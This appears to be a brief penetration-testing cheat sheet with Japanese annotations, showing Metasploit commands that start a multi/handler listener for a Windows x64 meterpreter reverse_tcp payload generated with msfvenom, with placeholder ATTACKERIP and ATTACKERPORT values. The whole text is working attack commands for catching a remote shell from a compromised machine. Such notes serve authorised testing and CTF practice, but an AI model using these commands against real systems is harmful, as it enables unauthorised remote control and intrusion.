
use multi/handler  
```
use exploit/multi/handler
```
  
set payload  
msfvenomで選んだpayloadをセットする  
```
set payload windows/x64/meterpreter/reverse_tcp
set lhost ATTACKERIP
set lport ATTACKERPORT
exploit
```

